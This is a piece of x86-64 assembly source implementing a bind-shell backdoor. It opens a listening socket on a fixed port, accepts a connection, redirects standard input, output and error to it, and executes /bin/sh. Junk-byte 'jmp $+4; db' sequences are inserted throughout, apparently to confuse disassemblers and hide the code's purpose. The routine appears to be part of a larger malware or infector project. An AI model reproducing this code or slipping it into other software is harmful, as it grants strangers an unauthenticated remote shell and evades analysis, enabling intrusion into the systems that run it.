remote_shell:
	enter REMOTE_SHELL_STACK_SIZE, 0
    jmp $+4
	db `\x0f\x11`
    ; Create socket
    mov rdi, AF_INET
    mov rsi, SOCK_STREAM
    xor rdx, rdx
    mov rax, SYS_SOCKET
    syscall
    js remote_shell_exit
    mov rbx, rax

    ; Configure Socket >> volatile <<
    ; https://stackoverflow.com/questions/10619952/how-to-completely-destroy-a-socket-connection-in-c
    mov rdi, rax
    mov rsi, SOL_SOCKET
    mov rdx, SO_REUSEADDR
    mov r10, 1
    push r10
    mov r10, rsp
    mov r8, 4
    mov rax, SYS_SETSOCKOPT
    syscall

	jmp $+4
	db `\x48\xc7`
    ; Initialize sockaddr struct to bind socket using it
	mov word [rsp + sockaddr_in.family], AF_INET
	mov word [rsp + sockaddr_in.port], PORT
	mov dword [rsp + sockaddr_in.inaddr], INADDR_ANY
	mov qword [rsp + sockaddr_in.zero], 0

    ;  Bind socket to IP/Port in sockaddr struct
    mov rdi, rbx
    mov rsi, rsp
    mov rdx, sockaddr_in_size
    mov rax, SYS_BIND
    jmp $+4
    db `\x69\x61`
    syscall
    cmp rax, 0
    js remote_shell_close_host

    ; Listen for incoming connections
    mov rdi, rbx
    mov rsi, 1
    mov rax, SYS_LISTEN
    syscall
    cmp rax, 0
    js remote_shell_close_host

	jmp $+4
	db `\x0f\x11`
    ; Accept incoming connection, don't store data, just use the sockfd created
    mov rdi, rbx
    xor rsi, rsi
    xor rdx, rdx
    mov rax, SYS_ACCEPT
    syscall
    mov r12, rax

	jmp $+4
	db `\x64\x48`
    ; Duplicate file descriptors for STDIN, STDOUT and STDERR
    mov rdi, rax
    mov rax, SYS_DUP2
    xor rsi, rsi
    syscall
    mov rax, SYS_DUP2
    inc rsi
    syscall
    mov rax, SYS_DUP2
    inc rsi
    syscall


    lea rdi, [rel bin_sh.sh]
    mov [rsp + sockaddr_in_size], rdi
    lea rdi, [rel bin_sh.arg1]
    mov [rsp + sockaddr_in_size + 8], rdi
    lea rdi, [rel bin_sh.arg2]
    mov [rsp + sockaddr_in_size + 16], rdi
    xor rdi, rdi
    mov [rsp + sockaddr_in_size + 24], rdi
    ; Execute /bin/sh 
    jmp $+4
    db `\x48\x8b`
    lea rdi, [rel bin_sh]
    lea rsi, [rsp + sockaddr_in_size]
    xor rdx, rdx
    mov rax, SYS_EXECVE
    syscall

	jmp $+4
	db `\x48\x83`
    mov rdi, r12
    mov rax, SYS_CLOSE
    syscall
    
    remote_shell_close_host:
    mov rdi, rbx
    mov rax, SYS_CLOSE
    syscall

    remote_shell_exit:
	leave
    ret
